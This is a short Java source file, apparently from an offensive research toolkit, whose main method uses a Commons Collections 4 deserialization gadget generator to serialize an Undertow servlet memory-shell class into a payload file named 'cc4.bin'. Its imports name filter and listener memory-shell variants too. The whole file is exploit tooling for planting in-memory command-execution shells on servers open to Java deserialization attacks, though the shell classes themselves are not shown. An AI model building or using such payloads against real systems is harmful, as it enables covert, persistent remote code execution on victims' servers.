package com.example.undertow.utils;

import com.example.undertow.memshell.UndertowFilterExecMS;
import com.example.undertow.memshell.UndertowListenerExecMS;
import com.example.undertow.memshell.UndertowServletExecMS;
import org.tools.ser.CC4Generator;

import java.util.ArrayList;
import java.util.List;

/**
 * @author Whoopsunix
 */
public class PayloadMake {
    public static void main(String[] args) throws Exception {
        cc4();
//        searchUndertow();
    }

    public static void cc4() throws Exception {
        CC4Generator cc4Generator = new CC4Generator();
//        String payload = cc4Generator.make(UndertowFilterExecMS.class);
//        System.out.println(payload.length());
        cc4Generator.makeFile(UndertowServletExecMS.class, "cc4.bin");
    }

}
